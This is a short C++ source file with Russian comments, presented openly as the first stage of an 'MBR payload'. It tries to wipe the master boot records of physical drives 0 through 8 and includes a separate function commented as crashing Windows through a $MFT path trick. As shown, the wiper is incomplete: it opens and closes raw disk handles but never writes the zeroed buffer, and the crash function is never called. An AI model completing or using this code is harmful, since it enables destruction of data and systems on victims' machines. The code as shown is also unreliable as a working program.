// Первый этап - MBR_Payload
#include <Windows.h> // специфичный для Windows заголовочный файл для программирования на С и С++.
#include <iostream> // заголовочный файл с классами, функциями и переменными для организации ввода-вывода в языке программирования C++.
#include <tchar.h>

using namespace std;

#define MBR_SIZE 512 // размер MBR всегда равен 512 байт.

int main()
{
	DWORD write;

	char mbr[MBR_SIZE];

	ZeroMemory(&mbr, (sizeof mbr));

	// Очистка структуры HDD0

	HANDLE ErasePhysicalDrive0 = CreateFile(L"\\\\.\\PhysicalDrive0",
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);
		CloseHandle(ErasePhysicalDrive0);

	// Очистка структуры HDD1

	HANDLE ErasePhysicalDrive1 = CreateFile(L"\\\\.\\PhysicalDrive1",
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);
	CloseHandle(ErasePhysicalDrive1);

	// Очистка структуры HDD2

	HANDLE ErasePhysicalDrive2 = CreateFile(L"\\\\.\\PhysicalDrive2",
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);
	CloseHandle(ErasePhysicalDrive2);

	// Очистка структуры HDD3

	HANDLE ErasePhysicalDrive3 = CreateFile(L"\\\\.\\PhysicalDrive3",
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);
	CloseHandle(ErasePhysicalDrive3);

	// Очистка структуры HDD4

	HANDLE ErasePhysicalDrive4 = CreateFile(L"\\\\.\\PhysicalDrive4",
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);
	CloseHandle(ErasePhysicalDrive4);

	// Очистка структуры HDD5

	HANDLE ErasePhysicalDrive5 = CreateFile(L"\\\\.\\PhysicalDrive5",
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);
	CloseHandle(ErasePhysicalDrive5);

	// Очистка структуры HDD6

	HANDLE ErasePhysicalDrive6 = CreateFile(L"\\\\.\\PhysicalDrive6",
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);
	CloseHandle(ErasePhysicalDrive6);

	// Очистка структуры HDD7

	HANDLE ErasePhysicalDrive7 = CreateFile(L"\\\\.\\PhysicalDrive7",
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);
	CloseHandle(ErasePhysicalDrive7);

	// Очистка структуры HDD8

	HANDLE ErasePhysicalDrive8 = CreateFile(L"\\\\.\\PhysicalDrive8",
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);
	CloseHandle(ErasePhysicalDrive8);

	return 0;

}
// Роняем винду)
int two(int arch, _TCHAR* argv[])
{
	HANDLE BSoD = CreateFile(L"C:\\$MFT\\youarestupid", FILE_READ_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);
	CloseHandle(BSoD);

	return 0;

}